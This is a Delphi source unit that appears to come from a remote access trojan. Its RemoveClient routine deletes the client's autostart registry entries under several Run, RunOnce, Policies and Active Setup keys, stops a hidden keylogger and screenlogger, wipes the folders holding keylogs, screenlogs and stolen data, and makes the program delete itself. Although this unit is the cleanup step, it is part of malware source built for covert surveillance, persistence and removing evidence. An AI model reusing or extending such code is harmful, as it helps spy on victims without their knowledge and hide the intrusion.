unit UnitInstallation;

interface

uses
  Windows, UnitConfiguration, UnitVariables, UnitKeyboard, UnitRegistryManager,
  UnitFunctions, UnitFilesManager, UnitScreenlogger;

procedure RemoveClient;

implementation

procedure RemoveClient;
begin   
  if _Startup = True then
  begin
    if _HKCUStartup then             
    DelRegKey('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\', _StartupKey);

    if _HKLMStartup then
    DelRegKey('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\', _StartupKey);

    if _PoliciesStartup then
    DelRegKey('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\', _StartupKey);

    if _ActiveX <> '' then
    DelRegKey('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\', _ActiveX);

    if _RunOnceStartup then
    begin
      DelRegKey('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\', _StartupKey);
      DelRegKey('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\', _StartupKey);
    end;
  end;

  if _Keylogger then StopOfflineKeylogger;
  if _Screenlogger then StopScreenlogger;

  DeleteAllFilesAndDir(PluginsPath);
  DeleteAllFilesAndDir(KeylogsPath);
  DeleteAllFilesAndDir(ScreenlogsPath);
  DeleteAllFilesAndDir(DatasPath);

  if _Install = False then
    if ClientPath = ParamStr(0) then MySelfDelete else MyDeleteFile(ClientPath)
  else
  begin
    if ClientPath = ParamStr(0) then
    begin
      MySelfDelete;
      MySelfDeleteFolder;
    end
    else
    begin
      MyDeleteFile(ClientPath);
      DeleteAllFilesAndDir(ExtractFilePath(ClientPath));
    end;
  end;
end;

end.
